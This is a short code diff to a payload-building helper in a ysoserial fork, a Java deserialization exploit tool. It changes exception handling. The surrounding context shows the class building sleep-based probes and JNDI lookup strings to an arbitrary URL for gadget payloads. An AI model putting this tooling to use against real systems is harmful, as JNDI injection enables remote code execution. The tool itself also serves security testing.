@@ -2,11 +2,10 @@ package ysoserial.payloads.custom;
 
 import sun.misc.BASE64Decoder;
 import ysoserial.payloads.util.CommonUtil;
-import java.io.IOException;
 import static ysoserial.payloads.custom.CustomCommand.*;
 
 public class TemplatesImplUtil {
-    public static String getCmd(String command) throws IOException {
+    public static String getCmd(String command) throws Exception {
         String cmd = null;
         if(command.toLowerCase().startsWith(COMMAND_SLEEP)) {
             int time = Integer.valueOf(command.substring(COMMAND_SLEEP.length())) * 1000;
@@ -91,7 +90,7 @@ public class TemplatesImplUtil {
             String jndiURL = command.substring(COMMAND_JNDI.length());
             cmd = String.format("new javax.naming.InitialContext().lookup(\"%s\");",jndiURL);
         } else {
-            new Exception(String.format("%s is unspport!",command));
+            throw new Exception(String.format("Command [%s] not supported",command));
         }
         return cmd;
     }
